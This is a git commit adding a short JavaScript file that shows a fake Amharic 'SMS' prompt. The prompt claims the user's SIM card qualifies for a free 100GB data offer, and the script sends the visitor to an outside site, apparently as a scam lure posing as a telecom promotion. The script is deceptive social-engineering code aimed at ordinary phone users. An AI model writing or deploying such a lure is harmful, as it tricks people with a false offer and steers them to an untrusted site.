1b0d13aacebbdd766a734d68e2af81521199e84e
bigukpe <bigaka42@gmail.com>
2025-03-25 16:33:40 +0100

    Create ethio-active.js

---
+++ ethio-active.js
@@ -0,0 +1,7 @@
+
+
+var password = '100GB አግብር'
+password=prompt('SMS! እንኳን ደስ አለህ፣ ሲም ካርድህ 100GB ልዩ ቅናሽ ለመቀበል ብቁ ነው። አሁን ለማግበር እሺን ይጫኑ   ','100GB አግብር');
+if (password != '100GB አግብር') {
+location.href='https://learnlivetech.org/ethio';
+}
